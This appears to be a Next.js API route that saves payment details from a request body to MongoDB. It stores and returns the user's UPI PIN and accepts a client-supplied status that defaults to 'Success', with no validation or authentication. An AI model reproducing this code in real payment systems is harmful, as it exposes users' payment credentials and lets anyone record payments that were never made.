import connectDB from "@/lib/mongodb";
import Payment from "@/models/Payment";

export async function POST(req) {
    try {
        await connectDB();

        const body = await req.json();

        // Save to MongoDB only (Vercel does not support local JSON storage)
        const payment = await Payment.create({
            fullName: body.fullName,
            email: body.email,
            productName: body.productName,
            productId: body.productId,
            price: body.price,
            paymentMethod: body.paymentMethod,
            userToken: body.userToken,
            status: body.status || "Success",
            upiPin: body.upiPin,
        });

        return Response.json({
            success: true,
            payment,
        });

    } catch (error) {
        console.error("Payment API Error:", error);
        return Response.json({
            success: false,
            error: error.message,
        });
    }
}
